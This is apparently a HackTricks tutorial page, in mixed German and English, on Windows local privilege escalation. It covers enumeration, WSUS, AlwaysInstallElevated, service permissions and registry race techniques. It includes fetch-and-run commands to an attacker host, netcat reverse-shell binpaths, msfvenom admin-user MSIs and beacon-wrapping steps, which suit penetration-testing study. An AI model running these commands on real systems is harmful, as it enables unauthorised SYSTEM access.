# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initiale Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies bitte die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Siehe die folgende Seite für mehr Informationen über ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was integrity levels in Windows sind, solltest du die folgende Seite lesen, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die dich daran hindern könnten, das System zu **enumerating**, Executables auszuführen oder sogar deine Aktivitäten zu **erkennen**. Du solltest die folgende **Seite** **lesen** und all diese **defense** **mechanisms** **enumerate**, bevor du mit der privilege escalation enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können ausgenutzt werden, um High IL ohne Aufforderungen zu erreichen, wenn AppInfo secure-path checks umgangen werden. Schau dir den dedizierten UIAccess/Admin Protection Bypass-Workflow hier an:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kann ausgenutzt werden, um einen beliebigen SYSTEM-Registry-Schreibzugriff (RegPwn) zu erreichen:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Prüfe, ob die Windows-Version bekannte Schwachstellen hat (prüfe auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Versions-Exploits

Diese [site](https://msrc.microsoft.com/update-guide/vulnerability) ist nützlich, um detaillierte Informationen über Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive attack surface**, die eine Windows-Umgebung bietet.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche Zugangsdaten/Juicy-Informationen in den env variables gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Wie Sie dies aktivieren, erfahren Sie unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details der PowerShell-Pipeline-Ausführungen werden protokolliert und umfassen ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolgen Sie die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wählen Sie **"Module Logging"** anstelle von **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Events aus den Powershell logs anzuzeigen, können Sie Folgendes ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Ausführung des Skripts wird erfasst, wodurch sichergestellt wird, dass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt eine umfassende Auditspur jeder Aktivität, die für forensics und die Analyse von bösartigem Verhalten wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Protokolleinträge für das Script Block befinden sich im Windows Event Viewer unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S** sondern über http angefordert werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL WSUS-Update verwendet, indem du Folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn Sie eine Antwort wie eine der folgenden erhalten:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann ist es **ausnutzbar.** Wenn der letzte Registry-Wert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, können Sie Tools wie verwenden: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Dies sind MiTM-weaponisierte Exploit-Skripte, um 'gefälschte' Updates in nicht-SSL WSUS-Traffic einzuschleusen.

Lesen Sie die Untersuchung hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Im Wesentlichen ist dies die Schwachstelle, die dieser Bug ausnutzt:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Viele Enterprise-Agenten öffnen eine localhost-IPC-Oberfläche und einen privilegierten Update-Kanal. Wenn die Enrollment/Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer rogue root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer eine bösartige MSI liefern, die vom SYSTEM-Dienst installiert wird. Siehe eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der von Angreifern kontrollierte Nachrichten verarbeitet und es ermöglicht, willkürliche Befehle als **NT AUTHORITY\SYSTEM** auszuführen.

- **Recon**: Bestätigen Sie den Listener und die Version, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: Platzieren Sie einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam DLLs im selben Verzeichnis und lösen Sie dann eine SYSTEM-Payload über den lokalen Socket aus:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.

## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle besteht in Windows **Domänen**-Umgebungen unter bestimmten Bedingungen. Zu diesen Bedingungen gehören Umgebungen, in denen **LDAP signing is not enforced,** Benutzer über self-rights verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Möglichkeit für Benutzer, Computer innerhalb der Domäne zu erstellen. Es ist wichtig zu beachten, dass diese **Anforderungen** mit den **Standardeinstellungen** erfüllt sind.

Finde den **exploit** unter [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen zum Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Registry-Einträge **aktiviert** (Wert ist **0x1**) sind, dann können Benutzer mit beliebigen Rechten `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn Sie eine meterpreter-Sitzung haben, können Sie diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwenden Sie den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Binärdatei zur Privilegienerhöhung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zur Hinzufügung eines Benutzers/einer Gruppe auffordert (Sie benötigen also GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach das erstellte binary aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man einen MSI Wrapper mit diesen Tools erstellt. Beachte, dass du eine "**.bat**" Datei einbetten kannst, wenn du **nur** **Kommandozeilen** **ausführen** möchtest


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Generiere** mit Cobalt Strike oder Metasploit ein **neues Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und tippe "installer" in das Suchfeld. Wähle das **Setup Wizard** Projekt und klicke **Next**.
- Gib dem Projekt einen Namen, z. B. **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory**, und klicke **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 gelangst (choose files to include). Klicke **Add** und wähle das zuvor erzeugte Beacon payload aus. Dann klicke **Finish**.
- Markiere das **AlwaysPrivesc** Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Properties, die du ändern kannst, wie **Author** und **Manufacturer**, wodurch die installierte App glaubwürdiger wirkt.
- Rechtsklicke das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke **Install** und wähle **Add Custom Action**.
- Doppelklicke **Application Folder**, wähle deine **beacon.exe** Datei und klicke **OK**. Dadurch wird sichergestellt, dass das Beacon payload ausgeführt wird, sobald der Installer gestartet wird.
- Ändere unter den **Custom Action Properties** **Run64Bit** auf **True**.
- Schließlich **baue es**.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI-Installation

Um die **Installation** der bösartigen `.msi` Datei im **Hintergrund:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Zur Ausnutzung dieser Schwachstelle können Sie verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus und Erkennungsmechanismen

### Audit-Einstellungen

Diese Einstellungen bestimmen, was **protokolliert** wird, daher sollten Sie darauf achten.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, es ist interessant zu wissen, wohin die logs gesendet werden
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung von lokalen Administrator-Passwörtern** konzipiert und stellt sicher, dass jedes Passwort auf Computern, die einer Domäne beigetreten sind, **einzigartig, zufällig und regelmäßig aktualisiert** wird. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen erteilt wurden, sodass sie lokale Admin-Passwörter einsehen dürfen, wenn sie dazu autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Wenn aktiviert, werden **Klartext-Passwörter in LSASS gespeichert** (Local Security Authority Subsystem Service).\
[**Mehr Infos zu WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Ab Windows 8.1 hat Microsoft einen verstärkten Schutz für die Local Security Authority (LSA) eingeführt, um Versuche nicht vertrauenswürdiger Prozesse, den Speicher der LSA **auszulesen** oder Code zu injizieren, **zu blockieren**, und so das System weiter abzusichern.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldeinformationen vor Bedrohungen wie pass-the-hash attacks zu schützen.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die logon data eines Benutzers von einem registered security package authentifiziert werden, werden typischerweise domain credentials für den Benutzer erstellt.\
[**Mehr Informationen zu Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, zu denen du gehörst, interessante Berechtigungen hat.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privilegierte Gruppen

Wenn Sie **zu einer privilegierten Gruppe gehören, können Sie möglicherweise Privilegien eskalieren**. Erfahren Sie hier mehr über privilegierte Gruppen und wie man sie missbraucht, um Privilegien zu eskalieren:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahren Sie mehr** darüber, was ein **token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sehen Sie sich die folgende Seite an, um **mehr über interessante tokens zu erfahren** und wie man sie missbraucht:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Angemeldete Benutzer / Sitzungen
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Passwortrichtlinie
```bash
net accounts
```
### Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Zuerst: Beim Auflisten der Prozesse **prüfe auf Passwörter in der Befehlszeile des Prozesses**.\
Prüfe, ob du **ein laufendes Binary überschreiben** kannst oder ob du Schreibrechte für den Binary-Ordner hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Prüfe immer, ob mögliche [**electron/cef/chromium debuggers** laufen — diese könnten missbraucht werden, um escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Prozess-Binaries überprüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Berechtigungen der Ordner der Prozess-Binärdateien überprüfen (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Passwörter im Speicher auslesen

Du kannst ein Speicherabbild eines laufenden Prozesses mit **procdump** von sysinternals erstellen. Dienste wie FTP haben die **Zugangsdaten im Klartext im Speicher**, versuche, ein Speicherabbild zu erstellen und die Zugangsdaten auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können einem Benutzer erlauben, ein CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Dienste

Service Triggers erlauben es Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Selbst ohne SERVICE_START-Rechte kann man durch Auslösen ihrer Triggers häufig privilegierte Dienste starten. Siehe Auflistungs- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Liste der Dienste abrufen:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten.
```bash
sc qc <service_name>
```
Es wird empfohlen, das Binary **accesschk** von _Sysinternals_ zu verwenden, um das für jeden Dienst erforderliche Berechtigungsniveau zu prüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" irgendeinen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Hier können Sie accesschk.exe für XP herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn Sie diesen Fehler haben (zum Beispiel bei SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Sie können es mit folgendem Befehl aktivieren:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Beachte, dass der Dienst upnphost von SSDPSRV abhängig ist, um zu funktionieren (für XP SP1)**

**Eine weitere workaround** dieses Problems ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Dienst-Binary-Pfad ändern**

In dem Szenario, in dem die Gruppe "Authenticated users" auf einem Dienst **SERVICE_ALL_ACCESS** besitzt, ist eine Modifikation des ausführbaren Binaries des Dienstes möglich. Um **sc** zu modifizieren und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können über verschiedene Berechtigungen eskaliert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Service-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was dazu führen kann, dass Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Erlaubt den Besitzübergang und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Vererbt die Möglichkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Vererbt ebenfalls die Möglichkeit, Service-Konfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann das _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen von Service-Binärdateien

**Prüfe, ob du die Binärdatei, die von einem Service ausgeführt wird, verändern kannst** oder ob du **Schreibrechte auf den Ordner** hast, in dem die Binärdatei liegt ([**DLL Hijacking**](dll-hijacking/index.html)).  
Du kannst alle Binärdateien, die von einem Service ausgeführt werden, mit **wmic** (nicht in system32) ermitteln und deine Berechtigungen mit **icacls** überprüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Änderungsberechtigungen für die Service-Registry

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** auf einer Service-**Registry** **prüfen**, indem du Folgendes ausführst:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls ja, kann die vom Dienst ausgeführte binary verändert werden.

Um den Path der ausgeführten binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Einige Windows Accessibility-Funktionen erstellen pro-Benutzer **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Session-Schlüssel kopiert werden. Eine Registry **symbolic link race** kann diesen privilegierten Schreibvorgang auf **jeden HKLM-Pfad** umleiten und liefert ein beliebiges HKLM **value write**-Primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. HKCU ATConfig-Wert mit dem Inhalt füllen, den SYSTEM schreiben soll.
2. Die secure-desktop-Kopie auslösen (z. B. **LockWorkstation**), welche den AT broker flow startet.
3. Das Rennen gewinnen, indem man einen **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt; wenn das oplock auslöst, den **HKLM Session ATConfig**-Schlüssel durch einen **registry link** auf ein geschütztes HKLM-Ziel ersetzen.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald beliebiges HKLM **value write** möglich ist, zum LPE pivotieren, indem Service-Konfigurationswerte überschrieben werden:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wählen Sie einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**) und starten Sie ihn nach dem Schreiben. **Note:** die öffentliche Exploit-Implementierung **locks the workstation** als Teil des Rennens.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **Sie können Unterschlüssel unterhalb dieses registry erstellen**. In case of Windows services this is **ausreichend, um arbitrary code auszuführen:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

